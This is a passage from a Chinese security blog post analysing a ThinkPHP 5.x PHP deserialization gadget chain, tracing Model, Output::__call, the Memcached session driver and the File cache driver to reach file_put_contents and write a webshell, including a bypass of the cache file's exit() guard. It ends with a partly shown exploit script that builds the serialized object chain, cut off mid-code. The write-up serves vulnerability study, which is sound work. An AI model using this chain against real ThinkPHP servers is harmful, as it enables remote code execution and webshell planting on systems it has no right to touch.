alt="image-20220813230308173"></p><p>这里首先判断了一下传入的参数是Relation类的对象（也就是$modelRelation）</p><p>可以看见下面有一个$value &#x3D; $this-&gt;parent，而<code>$parent</code>是可控的，这里如果能控制就很方便了。</p><p>看看判断条件：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> &amp;&amp; !<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">isSelfRelation</span>() &amp;&amp; <span class="title function_ invoke__">get_class</span>(<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getModel</span>()) == <span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;<span class="built_in">parent</span>))</span><br></pre></td></tr></table></figure><p>分析一下：</p><p>这里需要<code>$this-&gt;parent</code>存在，<code>$modelRelation</code>中存在<code>isSelfRelation()</code>且返回值为0，<code>$modelRelation</code>中存在<code>getModel()</code>方法。</p><p>满足以上条件之后，就可以进入if，然后令<code>$value=$this-&gt;partent</code>。所以<code>$value</code>也是可以控制的</p><h3 id="触发-call"><a href="#触发-call" class="headerlink" title="触发__call():"></a>触发__call():</h3><p>接下来就是要考虑怎么调用函数，来触发<code>__call()</code>。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">           <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">               <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                   <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                   <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                   <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">               &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                   <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                   <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                   <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                   <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="variable">$relation</span> = <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$name</span>, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">                   <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$relation</span>)) &#123;</span><br><span class="line">                       <span class="variable">$modelRelation</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$relation</span>();</span><br><span class="line">                       <span class="variable">$value</span>         = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationData</span>(<span class="variable">$modelRelation</span>);</span><br><span class="line"></span><br><span class="line">                       <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getBindAttr&#x27;</span>)) &#123;</span><br><span class="line">                           <span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getBindAttr</span>();</span><br><span class="line">                           <span class="keyword">if</span> (<span class="variable">$bindAttr</span>) &#123;</span><br><span class="line">                               <span class="keyword">foreach</span> (<span class="variable">$bindAttr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$attr</span>) &#123;</span><br><span class="line">                                   <span class="variable">$key</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>) ? <span class="variable">$attr</span> : <span class="variable">$key</span>;</span><br><span class="line">                                   <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                                       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;bind attr has exists:&#x27;</span> . <span class="variable">$key</span>);</span><br><span class="line">                                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                       <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br><span class="line">                                   &#125;</span><br><span class="line">                               &#125;</span><br><span class="line">                               <span class="keyword">continue</span>;</span><br><span class="line">                           &#125;</span><br><span class="line">                       &#125;</span><br><span class="line">                       <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                       <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$item</span>) ? <span class="variable">$item</span> : [];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h4 id="1、if-empty-this-gt-append"><a href="#1、if-empty-this-gt-append" class="headerlink" title="1、if (!empty($this-&gt;append))"></a>1、<code>if (!empty($this-&gt;append))</code></h4><p>可以直接控制，进入</p><h4 id="2、foreach-this-gt-append-as-key-gt-name"><a href="#2、foreach-this-gt-append-as-key-gt-name" class="headerlink" title="2、foreach ($this-&gt;append as $key =&gt; $name)"></a>2、<code>foreach ($this-&gt;append as $key =&gt; $name)</code></h4><p>控制了<code>$append</code>,可以直接进入。</p><h4 id="3、if-is-array-name"><a href="#3、if-is-array-name" class="headerlink" title="3、if (is_array($name))"></a>3、<code>if (is_array($name))</code></h4><p>令上一步中的<code>$name</code>不是数组，进入。</p><h4 id="4、elseif-strpos-name-39-39"><a href="#4、elseif-strpos-name-39-39" class="headerlink" title="4、elseif (strpos($name, &#39;.&#39;))"></a>4、<code>elseif (strpos($name, &#39;.&#39;))</code></h4><p><code>$name</code>不存在<code>.</code>，进入。</p><h4 id="5、if-method-exists-this-relation"><a href="#5、if-method-exists-this-relation" class="headerlink" title="5、if (method_exists($this, $relation))"></a>5、<code>if (method_exists($this, $relation))</code></h4><p>要保证在Model类中，<code>$relation</code>表示的函数存在即可进入。</p><h4 id="6、if-method-exists-modelRelation-39-getBindAttr-39"><a href="#6、if-method-exists-modelRelation-39-getBindAttr-39" class="headerlink" title="6、if (method_exists($modelRelation, &#39;getBindAttr&#39;))"></a>6、<code>if (method_exists($modelRelation, &#39;getBindAttr&#39;))</code></h4><p>保证在<code>$modelRelation</code>表示的类中存在<code>getBindAttr()</code>方法可以进入。</p><h4 id="7、if-bindAttr"><a href="#7、if-bindAttr" class="headerlink" title="7、if ($bindAttr)"></a>7、<code>if ($bindAttr)</code></h4><p>保证<code>$modelRelation-&gt;getBindAttr();</code>存在，可以进入</p><h4 id="8、if-isset-this-gt-data-key"><a href="#8、if-isset-this-gt-data-key" class="headerlink" title="8、if (isset($this-&gt;data[$key])) {"></a>8、<code>if (isset($this-&gt;data[$key])) &#123;</code></h4><p>使得<code>$data</code>中以<code>$key</code>为键的元素是空即可绕过。</p><h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><p>对于以上的八个关键点，进行分析：</p><p>因为我们可以控制<code>$append</code>，所以我们可以对<code>$key</code>和<code>$name</code>的值进行控制（通过第二点的foreach）。</p><p>接下来第三点，我们需要保证在<code>$append</code>中元素不为数组，这很好实现，随便写入一个字符串，例如<code>Ho1L0w-By</code>（只是一个例子）即可（但实际上后面的要求不一样，只是就目前情况分析）。</p><p>第四点，要求<code>$name</code>，也就是<code>$append</code>中的元素中不能有<code>.</code>，写的字符串已经实现了。</p><p>第五点和第六点需要一起看，就像是我们之前分析<code>$relation</code>和<code>$modelRelation</code>一样，为了控制第六点中的<code>$modelRelation</code>中存在<code>getBindAttr()</code>方法，我们需要将<code>$relation</code>控制写为<code>getError</code>，这样才能控制<code>$modelRelation</code>的值，使得<code>$modelRelation</code>中存在<code>getBindAttr()</code></p><p>那么总结一下上面的六点：</p><p><code>$append</code>中的<code>$key</code>和<code>$name</code>可以控制，且<code>$name</code>的值必须为<code>getError</code>，然后通过设置<code>$error</code>值，来进一步控制<code>$modelRelation</code>。<br>而根据我们之前对于<code>getRelationData()</code>方法中，<code>$value = $this-&gt;partent</code>的分析，这里来总结一下对于<code>$modelRelation</code>需要的条件</p><blockquote><p>1、是Relation对象</p><p>2、存在isSelfRelation()方法，且返回值存在</p><p>3、存在getModel()方法，且返回值与get_class($this-&gt;parent)相同。（双等号）</p><p>4、存在getBindAttr()</p></blockquote><p>进行用法查找：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815145619220.png" alt="image-20220815145619220"></p><p>可以看见这些里面都存在Relation的类。</p><p>而看过<code>Relation</code>类之后可以发现，在所有的Relation的子类中都存在<code>isSelfRelation()</code>和<code>getModel()</code>。</p><p>这里跟进一下<code>getModel()</code>函数：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815152010343.png" alt="image-20220815152010343"></p><p>查找一下用法，可以知道<code>$query</code>是可控的，这里需要知道哪个类的<code>getModel()</code>方法是可控的，来控制返回值。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815152358075.png" alt="image-20220815152358075"></p><p>可以看见是可控的，选择Query.php。</p><p>接下来就是在这些子类中找存在<code>getBindAttr()</code>方法的类</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815145954924.png" alt="image-20220815145954924"></p><p>在这里可以看见，和上面的重合点有一个，就是OneToOne.php里面。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815150109645.png" alt="image-20220815150109645"></p><p>而这里因为OneToOne这个类是抽象类，所以还需要找到它的子类。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815150422997.png" alt="image-20220815150422997"></p><p>这里可以选择HasOne.php。</p><p>这里就已经解决了<code>$modelRelation</code>的需求，可以继续看剩下的7，8点。</p><p>第七点需要我们返回的<code>$bindAttr</code>的值存在，看一下OneToOne.php中的<code>getBindAttr()</code>方法，可以看见是可控的，简单绕过。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815150950059.png" alt="image-20220815150950059"></p><p>第八点我们对$key的值溯源一下，</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815153550623.png" alt="image-20220815153550623"></p><p>看一下这个三元运算，只要<code>$key</code>是数字，就可以设置<code>$key</code>的值为<code>$attr</code>，可以看见<code>$key</code>和<code>$attr</code>都是我们可以进行控制的，因为<code>$bindAttr</code>可以控制。</p><p>到这里，已经可以执行我们需要的函数来触发<code>__call()</code>了。</p><h3 id="选择-call"><a href="#选择-call" class="headerlink" title="选择__call():"></a>选择__call():</h3><p>进行全局搜索，找到一个合适的__call()方法</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815155824034.png" alt="image-20220815155824034"></p><p>这里根据前人经验，可以选择Output.php（篇幅有限）</p><p> 这里是路径：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thinkphp/library/think/console/Output.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815163806285.png" alt="image-20220815163806285"></p><p>在这里主要需要看的是这两个函数：</p><p><code>array_unshift()</code>，<code>call_user_func_array()</code>。</p><p><code>array_unshift()</code> 函数用于向数组插入新元素。新数组的值将被插入到数组的开头。</p><p><code>call_user_func_array</code> — 调用回调函数，并把一个数组参数作为回调函数的参数</p><p>可以看到第一个没什么用，但是第二个比较有意思，这里可以调用回调函数。</p><blockquote><p>什么是回调函数？</p><p>通俗的来说，回调函数是一个我们定义的函数，但是不是我们直接来调用，而是通过另一个函数来调用，这个函数通过接收回调函数的名字和参数来实现对它的调用。</p></blockquote><p>看看手册里的说明。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815164709740.png" alt="image-20220815164709740"></p><p>因为是在</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>对__call()进行的触发，所以此处在__call()中的参数，<code>$method</code>是<code>getAttr()</code>，<code>$args</code>是<code>$attr</code>的值。</p><p>第一个if中，可以看见styles是可控的。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815172139229.png" alt="image-20220815172139229"></p><p>将<code>$styles</code>中的值多添加一个<code>getAttr()</code>即可进入</p><p>这里跟进类中的<code>block</code>方法：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815172258334.png" alt="image-20220815172258334"></p><p>跟进<code>writeln</code>(一看就很敏感)</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815172417267.png" alt="image-20220815172417267"></p><p>跟进<code>write</code></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815173426692.png" alt="image-20220815173426692"></p><p>查看一下<code>$handle</code>的用法</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815174938200.png" alt="image-20220815174938200"></p><p>反序列化是不会调用<code>__construct()</code>的，因此<code>$handle</code>可控</p><p>因此可以全局查看一下哪里的write可以利用：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815175911936.png" alt="image-20220815175911936"></p><p>这里可以看见有好几个write函数存在，也有多个可以利用的点。这里主要让我们看一下<code>Memcache.php</code>中的Write函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thinkphp/library/think/session/driver/Memcache.php</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Ho1L0w_By\AppData\Roaming\Typora\typora-user-images\image-20220815180145913.png" alt="image-20220815180145913"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815181922079.png" alt="image-20220815181922079"></p><p><code>$handler</code>可控，因此可以随便调用任何文件中的set函数，全局查找set函数：</p><p>这里还是使用Seay进行查找。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220820163631897.png" alt="image-20220820163631897"></p><p>这里可以看见很多不同的函数使用文件，可以都看一下，这里如果是想要使用写入webshell，主要的利用点在<code>File.php</code>文件中，文件路径：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thinkphp/library/think/cache/driver/File.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220820164054864.png" alt="image-20220820164054864"></p><p>可以看见危险函数<code>file_put_contents($filename,$data)</code>，这里可以用来写入webshell。具体内容可以由我们自己决定。</p><p>这里一般来说，只要我们使用一个<code>&lt;?php phpinfo(); ?&gt;</code>，然后访问对应文件，出现了详情页面，就可以用来证明漏洞存在了。</p><p>这里分析一下如何利用到这个<code>file_put_contents()</code>函数。</p><p>第一个if是判断<code>$expire</code>的，对<code>$expire</code>进行了设置。</p><p>第二个if用来判断<code>$expire</code>是不是<code>DataTime</code>的子类，设置时间戳。</p><p>然后将<code>$filename</code>调用<code>getCacheKey()</code>函数进行了值的设置，因为<code>$filename</code>是<code>file_put_contents()</code>函数中的一个参数，所以这里我们跟进函数。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$auto</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$name</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>); <span class="comment">//$name进行md5加密</span></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;cache_subdir&#x27;</span>]) &#123; </span><br><span class="line">           <span class="comment">// 使用子目录</span></span><br><span class="line">           <span class="variable">$name</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="number">0</span>, <span class="number">2</span>) . DS . <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="number">2</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>]) &#123;</span><br><span class="line">           <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . DS . <span class="variable">$name</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;path&#x27;</span>] . <span class="variable">$name</span> . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">       <span class="variable">$dir</span>      = <span class="title function_ invoke__">dirname</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$auto</span> &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">           <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$filename</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>可以看见两个if主要是用来更改文件名的，因为<code>$options</code>可以控制，所以可以直接修改之后绕过。</p><p>然后到了<code>$filename</code>进行设置的地方了，这里同样因为<code>$options</code>可以进行控制，所以基本是可以确定文件名是可控的，同时文件的后缀也是被写死了是.php。</p><p>后面的函数不会影响<code>$filename</code>，因此可以确定<code>$filename</code>可以控制。</p><p>继续分析，可以看见$data作为<code>file_put_contents()</code>函数的参数是进行序列化出来的，参数是使用的<code>$value</code>。</p><p>这里会出现两个问题，因为<code>$value</code>这个值是调用函数时传入的参数，在<code>writeln</code>中一路传过来的时候，已经是被确定了为布尔值的<code>true</code>，因此我们不能对<code>$value</code>达成控制的效果。</p><p>而这里，也可以看见<code>$data</code>的值也是被写死了，并且存在一个<code>exit()</code>函数，需要进行死亡绕过。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>; <span class="comment">//这里连接了一个$data</span></span><br></pre></td></tr></table></figure><p>如果不能解决这两个问题，这条链子是没法调用的。</p><p>这里需要往下看</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220822150924816.png" alt="image-20220822150924816"></p><p>跟进到setTagItem()，</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220822151141432.png" alt="image-20220822151141432"></p><p>可以看见这里将<code>$filename</code>作为参数传递进去，同时在下方继续对set()函数进行了调用，将$key和$value作为参数传递了回去。</p><p>可以看见，在这里的<code>$value</code>是赋值为了<code>$filename</code>的值，因此，如果是构造了较为合理的<code>$filename</code>，那么就可以进行文件的写入。</p><p>写入了文件之后，需要考虑到代码执行的问题，因此需要对exit()函数进行绕过，这里需要用到PHP伪协议的知识，来对exit()函数进行死亡绕过。</p><blockquote><p>死亡绕过参考：<a href="https://xz.aliyun.com/t/8163#toc-0">https://xz.aliyun.com/t/8163#toc-0</a></p></blockquote><p>到这里，这条链子算是走通了。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><p>按照我们现在进行的一系列分析，可以尝试写出EXP如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Pipes</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Windows</span> <span class="title class_">extends</span> <span class="title class_">Pipes</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">files</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Pivot</span></span>) //这里传入的需要是<span class="title">Pivot</span>的实例化对象</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = [<span class="variable">$Pivot</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Pivot类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="variable">$output</span>;  <span class="comment">//$this-&gt;parent=&gt; think\console\Output;</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append = <span class="keyword">array</span>(<span class="string">&quot;1&quot;</span>=&gt;<span class="string">&quot;getError&quot;</span>);     <span class="comment">//调用getError 返回this-&gt;error</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;error = <span class="variable">$modelRelation</span>;               <span class="comment">// $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类，也就是HasOne</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$output</span>, <span class="variable">$modelRelation</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//HasOne类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">HasOne</span> <span class="title class_">extends</span> <span class="title class_">OneToOne</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">OneToOne</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$query</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;selfRelation = <span class="number">0</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query = <span class="variable">$query</span>;    <span class="comment">//$query指向Query</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindAttr = [<span class="string">&#x27;xxx&#x27;</span>];<span class="comment">// $value值，作为call函数引用的第二变量</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Query类，用来匹配$parent</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Query</span> &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$model</span></span>) //传入的需要是<span class="title">Output</span>类的对象</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;model = <span class="variable">$model</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Output类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Output</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">styles</span> = [&quot;<span class="title class_">getAttr</span>&quot;];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle = <span class="variable">$handle</span>; <span class="comment">//是Memcached类的对象，需要调用这个里面的write</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Memcached类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Memcached</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">handler</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handler</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="variable">$handler</span>; <span class="comment">//是File类的对象，需要使用其中的set方法</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//File类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">File</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">options</span>=<span class="title class_">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options=[</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="string">&#x27;0&#x27;</span>, <span class="comment">//绕过getCacheKey中的第一个if</span></span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span 